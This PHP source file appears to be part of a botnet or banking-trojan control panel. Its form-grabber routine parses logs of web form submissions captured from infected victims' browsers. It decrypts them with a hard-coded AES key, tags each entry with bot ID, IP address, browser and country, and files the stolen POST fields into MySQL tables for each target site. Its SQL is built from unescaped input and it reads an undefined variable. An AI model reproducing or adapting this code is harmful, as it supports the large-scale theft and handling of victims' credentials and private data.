<?php

if(!function_exists('get_formgrabber')){	function get_formgrabber($log){		global $dir, $geoip_ex, $mysqli, $gi, $filters, $task, $fs, $cb;

		if($task->unnecessary != true){
			$match = explode('[~]', $log);
		}else{			$match = explode("[~]\r\n\r\n", $log);
		}

		$log = '';
		$unnecessary_uniq = array();
		$cbp = 0;
		$abp = count($match);

		if($abp > 0){
			foreach($match as $item){
				if($task->unnecessary != true){					$mitem = explode('[,]', $item);
				}else{					$mitem = explode("[,]\r\n", $item);
				}

				if(count($mitem) == 5){        			
				if($task->unnecessary != true){
					//$mitem[4] = @base64_decode($mitem[4]);
					if(preg_match('~gz\.txt$~is', $task->file)){
						if(strpos($var[0][4], 'LOG:') === 0){
							$mitem[4] = str_replace('LOG:', '', $mitem[4]);
							$mitem[4] = @rc_decode_aes(@gzinflate($mitem[4]), 'TnqbwNDcXdYFEw1Bh3j1ba2yC305aRAP');
						}else{
							$mitem[4] = @base64_decode($mitem[4]);
						}
					}else{
						if(base64_decode($var[0][4]) != false){
							$mitem[4] = @base64_decode($mitem[4]);
						}
					}
				}
				
				$log_start = $mitem[4];
	        		$mitem[4] = explode('|POST:', $mitem[4], 2);

	        		if(empty($mitem[4][0])) continue; // ссылка
					if(empty($mitem[4][1])) continue; // пост данные

	        		if(stripos($mitem[4][0], 'http://') === 0){
	        			$mitem['host'] = $host = get_host(preg_replace('~\((.*)\)~is', '', preg_replace('~[ ]+~is', '', $mitem[4][0])));
	        			$mitem['port'] = $port = @parse_url($mitem[4][0], PHP_URL_PORT);
	        		}elseif(stripos($mitem[4][0], 'https://') === 0){	        			$mitem['host'] = $host = get_host(preg_replace('~\((.*)\)~is', '', preg_replace('~[ ]+~is', '', $mitem[4][0])));
	        			$mitem['port'] = $port = @parse_url($mitem[4][0], PHP_URL_PORT);
	        		}elseif(stripos($mitem[4][0], 'site://') === 0){
	        			$mitem[4][0] = preg_replace('~\((.*)\)~is', '', preg_replace('~[ ]+~is', '', str_replace('site://', 'http://', $mitem[4][0])));
	        			$mitem['host'] = $host = get_host($mitem[4][0]);
	        			$mitem['port'] = $port = @parse_url($mitem[4][0], PHP_URL_PORT);
	        		}else{
	        			$mitem['host'] = $host = get_host('http://' . preg_replace('~\((.*)\)~is', '', preg_replace('~[ ]+~is', '', $mitem[4][0])));
	        			$mitem['port'] = $port = @parse_url('http://' . $mitem[4][0], PHP_URL_PORT);
	        		}

	        		if(empty($host)) continue;

					if($mitem[3] == '1'){
						$mitem['b'] = 'InternetExplorer';
					}elseif($mitem[3] == '2'){
						$mitem['b'] = 'MozillaFirefox';
					}elseif($mitem[3] == '3'){
						$mitem['b'] = 'Opera';
					}else{
						$mitem['b'] = 'Unknow';
					}

					if($geoip_ex != true){
						$mitem['country'] = geoip_country_code_by_name($mitem[2]);
					}else{
						$mitem['country'] = geoip_country_code_by_addr($gi, $mitem[2]);
					}
					if(empty($mitem['country'])) $mitem['country'] = 'UNK';

            		$import = true;

		    		if($import === true){
						if(isset($filters[$host])){
							parse_str($mitem[4][1], $keys);
							$keys = array_keys($keys);
							foreach($keys as $i => $key){
								if(strlen($key) <= 32){									$mysqli->query('update bf_filters set fields = concat(fields, \''.$key.',\') WHERE (id = \''.$filters[$host]['id'].'\') AND (fields NOT LIKE \'%'.$key.',%\') LIMIT 1');
								}else{									unset($keys[$i]);
								}
							}

							if(count($keys) > 0){
								$mysqli->query("INSERT DELAYED INTO bf_filter_".$filters[$host]['id']." (prefix, uid, country, md5_hash, program, type, post_date, url, fields, data, size) VALUES ('".$mitem[0]."', '".$mitem[1]."', '".$mitem['country']."', '".md5(implode('', $mitem[4]) . $task->type)."', '".$mitem['b']."', '".$task->type."', NOW(), '".urlencode($mitem[4][0])."', '".implode(',', $keys)."', '".urlencode($mitem[4][1])."', '".strlen($mitem[4][1])."')");
                                /*
							    if($filters[$host]['save_log'] == '1'){							    	$mysqli->query('INSERT DELAYED INTO bf_filters_save (host, file, type) VALUES (\''.$host.'\', \''.md5($host).'\', \''.$task->type.'\')');
							    	file_put_contents($dir['s'][$task->type] . '/' . md5($host), '<ID: '.$mitem[0].$mitem[1].' BROWSER: '.$mitem['b'].' IP: '.$mitem[2].' ('.$mitem['country'].')>' . "\r\n" . 'URL:' . "\r\n" . $mitem[4][0] . "\r\n" . 'POST:' . "\r\n" . str_replace('&', "\r\n", $mitem[4][1]) . "\r\n" . '#END#' . "\r\n\r\n", FILE_APPEND);
							    }
							    */
							}
						}else{
							/*
							if($task->unnecessary != true){
								if(empty($unnecessary_uniq[$host])){
									$unnecessary_uniq[$host] = md5($host);
									$mysqli->query('INSERT DELAYED INTO bf_filters_unnecessary (host, file, type) VALUES (\''.$host.'\', \''.$unnecessary_uniq[$host].'\', \''.$task->type.'\')');
								}
								file_put_contents($dir['u'][$task->type] . '/' . $unnecessary_uniq[$host], $mitem[0] . "[,]\r\n" . $mitem[1] . "[,]\r\n" . $mitem[2] . "[,]\r\n" . $mitem[3] . "[,]\r\n" . $log_start . "[~]\r\n\r\n", FILE_APPEND);
				    		}
				    		*/
						}
					}
				}
			}
    		unset($match, $unnecessary_uniq);
    		$cbp++;
    		file_put_contents($dir['site'] . 'cache/proc/' . $task->id, $fs . '|' . $cb . '|' . $abp . '|' . $cbp);
		}
	}
}

?>